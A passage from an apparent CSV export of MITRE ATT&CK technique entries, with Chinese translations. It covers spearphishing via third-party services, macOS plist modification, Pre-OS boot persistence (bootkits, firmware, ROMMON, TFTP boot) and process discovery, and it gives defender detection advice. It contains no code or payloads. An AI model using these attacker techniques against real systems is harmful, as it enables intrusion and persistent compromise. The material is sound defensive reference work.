A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.",https://attack.mitre.org/techniques/T1566/003,02 March 2020,18 October 2020,2.0,Initial Access,"Because most common third-party services used for spearphishing via service leverage TLS encryption, SSL/TLS inspection is generally required to detect the initial communication/delivery. With SSL/TLS inspection intrusion detection signatures or other security gateway appliances may be able to detect malware. 

Anti-virus can potentially detect malicious documents and files that are downloaded on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts.","Linux, Windows, macOS","Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1566,,,,,,CAPEC-163,,,"(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: SecureWorks Mia Ash July 2017),(Citation: FireEye Operation Saffron Rose 2013),(Citation: ClearSky Lazarus Aug 2020),(Citation: FireEye APT34 July 2019),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: ClearSky Kittens Back 3 August 2020),(Citation: SANS Windshift August 2018),(Citation: Microsoft Phosphorus Mar 2019),(Citation: Lookout Dark Caracal Jan 2018),(Citation: Google TAG Lazarus Jan 2021),(Citation: ESET Lazarus Jun 2020),(Citation: Google EXOTIC LILY March 2022),",网络钓鱼：通过服务进行鱼叉式网络钓鱼,攻击者可能会通过第三方服务发送鱼叉式钓鱼消息，以试图访问受害系统。通过服务进行鱼叉式网络钓鱼是鱼叉式网络钓鱼的一种特定变体。它与其他形式的鱼叉式网络钓鱼不同，它使用第三方服务，而不是直接通过企业电子邮件渠道。所有形式的鱼叉式网络钓鱼都是针对特定个人、公司或行业的电子社交工程。在这种情况下，攻击者通过各种社交媒体服务、个人网络邮件和其他非企业控制的服务发送消息。与企业相比，这些服务更有可能具有不那么严格的安全策略。与大多数鱼叉式网络钓鱼一样，目标是与目标建立融洽关系或以某种方式获得目标的兴趣。攻击者将创建虚假的社交媒体账户并向员工发送信息以获得潜在的工作机会。这样做可以提供一个合理的理由来询问在环境中运行的服务、策略和软件。然后，攻击者可以通过这些服务发送恶意链接或附件。一个常见的例子是通过社交媒体与目标建立融洽的关系，然后将内容发送到目标在其工作计算机上使用的个人网络邮件服务。这允许攻击者绕过对工作帐户的一些电子邮件限制，并且目标更有可能打开文件，因为这是他们所期望的。如果有效载荷没有按预期工作，攻击者可以继续正常通信并与目标进行故障排除，以了解如何使其工作。
T1647,Plist File Modification,"Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the <code>info.plist</code> file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format.(Citation: fileinfo plist file description) 

Adversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. [Hidden Window](https://attack.mitre.org/techniques/T1564/003)) or running additional commands for persistence (ex: [Launch Agent](https://attack.mitre.org/techniques/T1543/001)/[Launch Daemon](https://attack.mitre.org/techniques/T1543/004) or [Re-opened Applications](https://attack.mitre.org/techniques/T1547/007)).

For example, adversaries can add a malicious application path to the `~/Library/Preferences/com.apple.dock.plist` file, which controls apps that appear in the Dock. Adversaries can also modify the <code>LSUIElement</code> key in an application’s <code>info.plist</code> file  to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as <code>LSEnvironment</code>, to enable persistence via [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006).(Citation: wardle chp2 persistence)(Citation: eset_osx_flashback)",https://attack.mitre.org/techniques/T1647,09 April 2022,20 April 2022,1.0,Defense Evasion,"Monitor for common command-line editors used to modify plist files located in auto-run locations, such as <code>\~/LaunchAgents</code>, <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>, and an application's <code>Info.plist</code>. 

Monitor for plist file modification immediately followed by code execution from <code>\~/Library/Scripts</code> and <code>~/Library/Preferences</code>. Also, monitor for significant changes to any path pointers in a modified plist.

Identify new services executed from plist modified in the previous user's session. ",macOS,"Command: Command Execution, File: File Modification, Process: Process Creation, Service: Service Creation",False,,,,,,,,,,"(Citation: trendmicro xcsset xcode project 2020),(Citation: Apple Developer Doco Hardened Runtime)",plist文件修改/属性列表文件修改,攻击者可能会修改属性列表文件（plist 文件）以启用其他恶意活动，同时还可能规避和绕过系统防御。 macOS 应用程序使用 plist 文件（例如 <code>info.plist</code> 文件）来存储通知操作系统如何在运行时处理应用程序的属性和配置设置。 Plist 文件是基于 Apple 的 Core Foundation DTD 以 XML 格式格式化的键值对中的结构化元数据。 plist 文件可以保存为文本或二进制格式。（引用：fileinfo plist 文件描述）攻击者可以修改 plist 文件中的键值对以影响系统行为，例如隐藏应用程序的执行（即 [隐藏窗口]（https ://attack.mitre.org/techniques/T1564/003)）或运行其他命令以实现持久性（例如：[Launch Agent](https://attack.mitre.org/techniques/T1543/001)/[Launch Daemon ](https://attack.mitre.org/techniques/T1543/004) 或 [重新打开的应用程序](https://attack.mitre.org/techniques/T1547/007))。例如，攻击者可以将恶意应用程序路径添加到 `~/Library/Preferences/com.apple.dock.plist` 文件，该文件控制出现在 Dock 中的应用程序。攻击者还可以修改应用程序 <code>info.plist</code> 文件中的 <code>LSUIElement</code> 键以在后台运行应用程序。攻击者还可以插入键值对来插入环境变量，例如 <code>LSEnvironment</code>，以通过 [Dynamic Linker Hijacking] 启用持久性 (https://attack.mitre.org/techniques/T1574/006) .（引文：wardle chp2 持久性）（引文：eset_osx_flashback）
T1542,Pre-OS Boot,"Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.(Citation: Wikipedia Booting)

Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.",https://attack.mitre.org/techniques/T1542,13 November 2019,19 April 2022,1.1,"Defense Evasion, Persistence","Perform integrity checking on pre-OS boot mechanisms that can be manipulated for malicious purposes. Take snapshots of boot records and firmware and compare against known good images. Log changes to boot records, BIOS, and EFI, which can be performed by API calls, and compare against known good behavior and patching.

Disk check, forensic utilities, and data from device drivers (i.e. processes and API calls) may reveal anomalies that warrant deeper investigation.(Citation: ITWorld Hard Disk Health Dec 2014)","Linux, Network, Windows, macOS","Command: Command Execution, Drive: Drive Modification, Driver: Driver Metadata, Firmware: Firmware Modification, Network Traffic: Network Connection Creation, Process: OS API Execution",False,,"Anti-virus, File monitoring, Host intrusion prevention systems",,,,,,,,",(Citation: TCG Trusted Platform Module),(Citation: TechNet Secure Boot Process)",操作系统前引导/预操作系统启动,攻击者可能会滥用 Pre-OS Boot 机制作为在系统上建立持久性的一种方式。在计算机的启动过程中，固件和各种启动服务在操作系统之前被加载。这些程序在操作系统控制之前控制执行流程。（引用：维基百科引导）攻击者可能会覆盖引导驱动程序或固件中的数据，例如 BIOS（基本输入/输出系统）和统一可扩展固件接口（UEFI）以持续存在操作系统下一层的系统。这可能特别难以检测，因为基于主机软件的防御无法检测到此级别的恶意软件。
T1542.003,Pre-OS Boot: Bootkit,"Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.

A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: Mandiant M Trends 2016) The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)

The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",https://attack.mitre.org/techniques/T1542/003,19 December 2019,17 September 2020,1.1,"Defense Evasion, Persistence",Perform integrity checking on MBR and VBR. Take snapshots of MBR and VBR and compare against known good samples. Report changes to MBR and VBR as they occur for indicators of suspicious activity and further analysis.,"Linux, Windows",Drive: Drive Modification,True,T1542,"Anti-virus, File monitoring, Host intrusion prevention systems",,"Administrator, SYSTEM",,,CAPEC-552,,,"(Citation: ESET Sednit Part 3),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Microsoft WhisperGate January 2022),(Citation: Cybereason WhisperGate February 2022),(Citation: FireEye BOOTRASH SANS),(Citation: Medium S2W WhisperGate January 2022),(Citation: FinFisher Citation),(Citation: Crowdstrike WhisperGate January 2022),(Citation: Mandiant M Trends 2016),(Citation: Novetta Blockbuster),(Citation: Novetta Blockbuster Destructive Malware),(Citation: FireEye APT41 Aug 2019),(Citation: ESET Carberp March 2012),(Citation: Eclypsium Trickboot December 2020),(Citation: Microsoft FinFisher March 2018),(Citation: FireEye Bootkits),(Citation: TCG Trusted Platform Module),(Citation: TechNet Secure Boot Process)",操作系统前引导/预操作系统启动：Bootkit,攻击者可能会使用 bootkits 在系统上持续存在。 Bootkits 位于操作系统下方的一层，可能难以执行全面修复，除非组织怀疑使用了 Bootkits 并可以采取相应措施。 bootkit 是一种恶意软件变体，它会修改硬盘驱动器的引导扇区，包括主引导记录 (MBR) 和卷引导记录 (VBR)。 （引用：Mandiant M Trends 2016） MBR 是 BIOS 完成硬件初始化后首先加载的磁盘部分。它是引导加载程序的位置。对引导驱动器具有原始访问权限的攻击者可能会覆盖该区域，从而在启动期间将执行从正常引导加载程序转移到攻击者代码。 （引文：Lau 2011）MBR 将引导过程的控制权传递给 VBR。与 MBR 的情况类似，对引导驱动器具有原始访问权限的攻击者可能会覆盖 VBR，以在启动期间将执行转移到攻击者代码。
T1542.002,Pre-OS Boot: Component Firmware,"Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1542/001) but conducted upon other system components/devices that may not have the same capability or level of integrity checking.

Malicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",https://attack.mitre.org/techniques/T1542/002,19 December 2019,01 April 2022,1.1,"Defense Evasion, Persistence","Data and telemetry from use of device drivers (i.e. processes and API calls) and/or provided by SMART (Self-Monitoring, Analysis and Reporting Technology) disk monitoring may reveal malicious manipulations of components.(Citation: SanDisk SMART)(Citation: SmartMontools) Otherwise, this technique may be difficult to detect since malicious activity is taking place on system components possibly outside the purview of OS security and integrity mechanisms.

Disk check and forensic utilities may reveal indicators of malicious firmware such as strings, unexpected disk partition table entries, or blocks of otherwise unusual memory that warrant deeper investigation.(Citation: ITWorld Hard Disk Health Dec 2014) Also consider comparing components, including hashes of component firmware and behavior, against known good images.","Linux, Windows, macOS","Driver: Driver Metadata, Firmware: Firmware Modification, Process: OS API Execution",True,T1542,"Anti-virus, File monitoring, Host intrusion prevention systems",,SYSTEM,,Ability to update component device firmware from the host operating system.,,,,"(Citation: Kaspersky Equation QA),(Citation: NCSC Cyclops Blink February 2022),",操作系统前引导/预操作系统启动：组件固件,攻击者可能会修改组件固件以在系统上持续存在。一些攻击者可能会采用复杂的手段来破坏计算机组件并安装恶意固件，这些固件将在操作系统和主系统固件或 BIOS 之外执行攻击者代码。此技术可能类似于 [系统固件](https://attack.mitre.org/techniques/T1542/001)，但在可能不具有相同能力或完整性检查级别的其他系统组件/设备上执行。恶意组件固件既可以提供对系统的持续访问级别，尽管维护访问和硬盘重新映像的潜在典型故障，以及一种逃避基于主机软件的防御和完整性检查的方法。
T1542.004,Pre-OS Boot: ROMMONkit,"Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. (Citation: Cisco Synful Knock Evolution)(Citation: Cisco Blog Legacy Device Attacks)


ROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to [TFTP Boot](https://attack.mitre.org/techniques/T1542/005), an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.",https://attack.mitre.org/techniques/T1542/004,20 October 2020,22 October 2020,1.0,"Defense Evasion, Persistence","There are no documented means for defenders to validate the operation of the ROMMON outside of vendor support. If a network device is suspected of being compromised, contact the vendor to assist in further investigation.",Network,Firmware: Firmware Modification,True,T1542,,,Administrator,,,,,,",(Citation: Cisco IOS Software Integrity Assurance - Secure Boot),(Citation: Cisco IOS Software Integrity Assurance - Change Control),(Citation: Cisco IOS Software Integrity Assurance - Image File Verification),(Citation: Cisco IOS Software Integrity Assurance - Image File Integrity)",操作系统前引导/预操作系统启动：ROMMONkit,攻击者可能会滥用 ROM 监视器 (ROMMON)，通过使用攻击者代码加载未经授权的固件来提供持久访问和操纵难以检测的设备行为。 （引用：Cisco Synful Knock Evolution）（引用：Cisco Blog Legacy Device Attacks） ROMMON 是一种思科网络设备固件，可用作引导加载程序、引导映像或引导帮助程序，以在平台通电或重置时初始化硬件和软件.与 [TFTP Boot](https://attack.mitre.org/techniques/T1542/005) 类似，攻击者可以使用攻击者代码在本地或远程（例如，通过 TFTP）升级 ROMMON 映像并按顺序重新启动设备覆盖现有的 ROMMON 映像。这为攻击者提供了更新 ROMMON 的方法，从而以难以检测的方式在系统上获得持久性。
T1542.001,Pre-OS Boot: System Firmware,"Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. (Citation: Wikipedia BIOS) (Citation: Wikipedia UEFI) (Citation: About UEFI)

System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",https://attack.mitre.org/techniques/T1542/001,19 December 2019,19 May 2020,1.0,"Defense Evasion, Persistence","System firmware manipulation may be detected. (Citation: MITRE Trustworthy Firmware Measurement) Dump and inspect BIOS images on vulnerable systems and compare against known good images. (Citation: MITRE Copernicus) Analyze differences to determine if malicious changes have occurred. Log attempts to read/write to BIOS and compare against known patching behavior.

Likewise, EFI modules can be collected and compared against a known-clean list of EFI executable binaries to detect potentially malicious modules. The CHIPSEC framework can be used for analysis to determine if firmware modifications have been performed. (Citation: McAfee CHIPSEC Blog) (Citation: Github CHIPSEC) (Citation: Intel HackingTeam UEFI Rootkit)",Windows,Firmware: Firmware Modification,True,T1542,"Anti-virus, File monitoring, Host intrusion prevention systems","Jean-Ian Boutin, ESET; McAfee; Ryan Becwar","Administrator, SYSTEM",,,CAPEC-532,,,"(Citation: TrendMicro Hacking Team UEFI),(Citation: ESET LoJax Sept 2018),(Citation: Ge 2011),(Citation: TCG Trusted Platform Module),(Citation: ESET LoJax Sept 2018),(Citation: Intel Hardware-based Security Technologies)",操作系统前引导/预操作系统启动：系统固件,攻击者可能会修改系统固件以在系统上持续存在。BIOS（基本输入/输出系统）和统一可扩展固件接口 (UEFI) 或可扩展固件接口 (EFI) 是作为操作系统之间的软件接口运行的系统固件的示例和计算机的硬件。 （引用：Wikipedia BIOS）（引用：Wikipedia UEFI）（引用：关于 UEFI） BIOS 和 (U)EFI 等系统固件是计算机功能的基础，并且可能被对手修改以执行或协助恶意活动。存在覆盖系统固件的能力，这可能为老练的对手提供一种安装恶意固件更新的手段，作为在可能难以检测到的系统上的持久性手段。
T1542.005,Pre-OS Boot: TFTP Boot,"Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.

Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with [Modify System Image](https://attack.mitre.org/techniques/T1601) to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) and may result in the network device running a modified image. (Citation: Cisco Blog Legacy Device Attacks)",https://attack.mitre.org/techniques/T1542/005,20 October 2020,22 October 2020,1.0,"Defense Evasion, Persistence","Consider comparing a copy of the network device configuration and system image against a known-good version to discover unauthorized changes to system boot, startup configuration, or the running OS. (Citation: Cisco IOS Software Integrity Assurance - Secure Boot) (Citation: Cisco IOS Software Integrity Assurance - Image File Verification)The same process can be accomplished through a comparison of the run-time memory, though this is non-trivial and may require assistance from the vendor.  (Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)

Review command history in either the console or as part of the running memory to determine if unauthorized or suspicious commands were used to modify device configuration. (Citation: Cisco IOS Software Integrity Assurance - Command History) Check boot information including system uptime, image booted, and startup configuration to determine if results are consistent with expected behavior in the environment. (Citation: Cisco IOS Software Integrity Assurance - Boot Information) Monitor unusual connections or connection attempts to the device that may specifically target TFTP or other file-sharing protocols.",Network,"Command: Command Execution, Firmware: Firmware Modification, Network Traffic: Network Connection Creation",True,T1542,,,Administrator,,,,,,",(Citation: Cisco IOS Software Integrity Assurance - AAA),(Citation: Cisco IOS Software Integrity Assurance - Secure Boot),(Citation: Cisco IOS Software Integrity Assurance - Change Control),(Citation: Cisco IOS Software Integrity Assurance - Image File Verification),(Citation: Cisco IOS Software Integrity Assurance - Image File Integrity),(Citation: Cisco IOS Software Integrity Assurance - TACACS)",操作系统前引导/预操作系统启动：TFTP 引导,攻击者可能会滥用网络引导从普通文件传输协议 (TFTP) 服务器加载未经授权的网络设备操作系统。网络管理员通常使用 TFTP 引导 (netbooting) 从集中管理服务器加载配置控制的网络设备映像。网络引导是引导序列中的一种选项，可用于集中、管理和控制设备映像。攻击者可能会操纵网络设备上的配置，指定使用恶意 TFTP 服务器，该服务器可与 [修改系统映像](https://attack.mitre.org/techniques/T1601) 结合使用以在其上加载修改后的映像设备启动或重置。未经授权的图像允许攻击者修改设备配置，向设备添加恶意功能，并引入后门以维持对网络设备的控制，同时通过使用标准功能最大限度地减少检测。此技术类似于 [ROMMONkit](https://attack.mitre.org/techniques/T1542/004)，可能会导致网络设备运行修改后的映像。 （引文：思科博客旧设备攻击）
T1057,Process Discovery,"Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

In Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via /proc.",https://attack.mitre.org/techniques/T1057,31 May 2017,26 March 2020,1.2,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Normal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","Linux, Windows, macOS","Command: Command Execution, Process: OS API Execution, Process: Process Creation",False,,,,"Administrator, SYSTEM, User",,"Administrator, SYSTEM may provide better process ownership details",CAPEC-573,,,"(Citation: Trend Micro Ransomware February 2021),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Proofpoint Azorult July 2018),(Citation: CISA SoreFang July 2016),(Citation: Cybereason Valak May 2020),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Volexity SolarWinds),(Citation: Symantec Inception Framework March 2018),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Trend Micro Waterbear December 2019),(Citation: McAfee Bankshot),(Citation: ESET Turla PowerShell May 2019),(Citation: Talos Cobalt Strike September 2020),(Citation: Kaspersky Lyceum October 2021),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: FoxIT Wocao December 2019),(Citation: ATT QakBot April 2021),(Citation: ESET Sednit Part 1),(Citation: ESET RTM Feb 2017),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Microsoft Tasklist),(Citation: FireEye Ransomware Feb 2020),(Citation: Trend Micro Tick November 2019),(Citation: RATANKBA),(Citation: Imminent Unit42 Dec2019),(Citation: ESET Trickbot Oct 2020),(Citation: FinFisher Citation),(Citation: Arxiv Avaddon Feb 2021),(Citation: ESET LoudMiner June 2019),(Citation: AlienVault Sykipot 2011),(Citation: ESET Zebrocy Nov 2018),(Citation: ESET Sednit Part 2),(Citation: FireEye APT17),(Citation: GitHub PowerSploit May 2012),(Citation: Talos Promethium June 2020),(Citation: Securelist Dtrack),(Citation: ESET Zebrocy May 2019),(Citation: Securelist Darkhotel Aug 2015),(Citation: McAfee Babuk February 2021),(Citation: Accenture Dragonfish Jan 2018),(Citation: SentinelOne FrameworkPOS September 2019),(Citation: FireEye Clandestine Fox),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Cybereason Bazar July 2020),(Citation: Palo Alto Comnie),(Citation: Malwarebytes IssacWiper CaddyWiper March 2022 ),(Citation: Novetta Blockbuster),(Citation: Trusteer Carberp October 2010),(Citation: Symantec Hydraq Jan 2010),(Citation: Medium Metamorfo Apr 2020),(Citation: Unit 42 DarkHydrus July 2018),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Symantec Shuckworm January 2022),(Citation: Unit 42 Sofacy Feb 2018),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Trend Micro DRBControl February 2020),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: BlackBerry CostaRicto November 2020),(Citation: Kaspersky TajMahal April 2019),(Citation: ESET ForSSHe December 2018),(Citation: FireEye APT34 Dec 2017),(Citation: Palo Alto menuPass Feb 2017),(Citation: TrendMicro macOS Dacls May 2020),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Sofacy Komplex Trojan),(Citation: Trustwave Pillowmint June 2020),(Citation: Unit 42 CARROTBAT January 2020),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Scarlet Mimic Jan 2016),(Citation: ASEC Emotet 2017),(Citation: Zscaler Higaisa 2020),(Citation: ClearSky MuddyWater June 2019),(Citation: McAfee Cuba April 2021),(Citation: McAfee Sharpshooter December 2018),(Citation: CheckPoint Naikon May 2020),(Citation: Unit 42 Tropic Trooper Nov 2016),(Citation: Unit42 Sofacy Dec 2018),(Citation: CIRCL PlugX March 2013),(Citation: Secureworks Karagany July 2019),(Citation: Github PowerShell Empire),(Citation: Symantec Dragonfly),(Citation: Trend Micro KillDisk 2),(Citation: ESET PipeMon May 2020),(Citation: Unit 42 Playbook Dec 2017),(Citation: Kaspersky Turla Aug 2014),(Citation: Symantec Volgmer Aug 2014),(Citation: Talos NavRAT May 2018),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Profero APT27 December 2020),(Citation: McAfee Gold Dragon),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: McAfee Maze March 2020),(Citation: McAfee Oceansalt Oct 2018),(Citation: Palo Alto OilRig May 2016),(Citation: Talos Bisonal Mar 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: TrendMicro Ursnif Mar 2015),(Citation: Check Point APT35 CharmPower January 2022),(Citation: FireEye Periscope March 2018),(Citation: Donut Github),(Citation: Antiy CERT Ramsay April 2020),(Citation: Unit 42 VERMIN Jan 2018),(Citation: JPCert TSCookie March 2018),(Citation: Kaspersky Andariel Ransomware June 2021),(Citation: Symantec Frutas Feb 2013),(Citation: Anomali Rocke March 2019),(Citation: Proofpoint TA505 October 2019),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Novetta Winnti April 2015),(Citation: FireEye CARBANAK June 2017),(Citation: Kaspersky Poseidon Group),(Citation: Avira Mustang Panda January 2020),(Citation: ESET Carbon Mar 2017),(Citation: Unit 42 Kazuar May 2017),(Citation: BiZone Lizar May 2021),(Citation: McAfee GhostSecret),(Citation: Unit 42 IronNetInjector February 2021 ),(Citation: Aqua Kinsing April 2020),(Citation: PowerSploit Documentation),(Citation: NCC Group APT15 Alive and Strong),(Citation: McAfee Honeybee),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET Grandoreiro April 2020),(Citation: Proofpoint Bumblebee April 2022),(Citation: Cyphort EvilBunny Dec 2014),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: ESET BlackEnergy Jan 2016),(Citation: Microsoft PLATINUM April 2016),(Citation: Baumgartner Naikon 2015),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Malwarebytes Konni Aug 2021),(Citation: Cisco Talos Intelligence Group),(Citation: Talos ROKRAT),(Citation: Fortinet Agent Tesla June 2017),(Citation: Unit 42 Bisonal July 2018),(Citation: FireEye APT37 Feb 2018),(Citation: Trend Micro IXESHE 2012),(Citation: Symantec Pasam May 2012),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Kaspersky CactusPete Aug 2020),(Citation: Medium KONNI Jan 2020),(Citation: evolution of pirpi),(Citation: SentinelLabs reversing run-only applescripts 2021),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Talos Group123),(Citation: Check Point Warzone Feb 2020),(Citation: Lazarus APT January 2022),(Citation: Unit 42 Lucifer June 2020),(Citation: Unit42 Azorult Nov 2018),(Citation: GitHub Pupy),(Citation: Securelist MuddyWater Oct 2018),(Citation: ATT Sidewinder January 2021),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Symantec W32.Duqu),(Citation: Symantec Bumblebee June 2022),(Citation: Palo Alto CVE-2015-3113 July 2015),(Citation: Kaspersky Turla),(Citation: Talos Oblique RAT March 2021),(Citation: Unit42 Cannon Nov 2018),(Citation: NCSC Cyclops Blink February 2022),(Citation: ESET InvisiMole June 2020),(Citation: FireEye NETWIRE March 2019),(Citation: ESET InvisiMole June 2018),(Citation: Palo Alto MoonWind March 2017),(Citation: Palo Alto Networks BBSRAT),(Citation: NCCGroup RokRat Nov 2018),(Citation: Malwarebytes DarkComet March 2018),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Sogeti CERT ESEC Babuk March 2021),(Citation: Trend Micro njRAT 2018),(Citation: Unit 42 Gamaredon February 2022),(Citation: Dragos EKANS),(Citation: Talos GravityRAT),(Citation: FOX-IT May 2016 Mofang),(Citation: Kaspersky MoleRATs April 2019),(Citation: Novetta Blockbuster Loaders),(Citation: TrendMicro BKDR_URSNIF.SM),(Citation: Talos ZxShell Oct 2014),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: Securelist APT10 March 2021),(Citation: NTT Security Flagpro new December 2021),(Citation: Korean FSI TA505 2020),(Citation: ESET Dukes October 2019),(Citation: Trend Micro Skidmap),(Citation: Threatpost Lizar May 2021),(Citation: Cylance Shell Crew Feb 2017),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Fortinet Diavol July 2021),(Citation: Unit 42 Nokki Oct 2018),(Citation: Volexity PowerDuke November 2016),(Citation: Symantec Orangeworm April 2018),(Citation: F-Secure The Dukes),(Citation: Fysbis Dr Web Analysis),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: ESET DazzleSpy Jan 2022),(Citation: Kaspersky Winnti April 2013),(Citation: Intezer Doki July 20),(Citation: CyberBit Dtrack),(Citation: Talos PoetRAT April 2020),(Citation: CrowdStrike Ryuk January 2019),(Citation: ESET Gelsemium June 2021),(Citation: Rancor Unit42 June 2018),(Citation: Alperovitch 2014),(Citation: Mandiant APT1),(Citation: DustySky),(Citation: CrowdStrike StellarParticle January 2022),(Citation: FireEye APT30),(Citation: Trend Micro TeamTNT),(Citation: Fidelis Turbo),(Citation: Secure List Bad Rabbit),(Citation: Lazarus RATANKBA),(Citation: Talos Frankenstein June 2019),(Citation: MSTIC FoggyWeb September 2021),(Citation: CrowdStrike Putter Panda),(Citation: CarbonBlack Conti July 2020),(Citation: objsee mac malware 2017),(Citation: ESET Machete July 2019),(Citation: TrendMicro BlackTech June 2017),(Citation: Symantec Linfo May 2012),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: FireEye 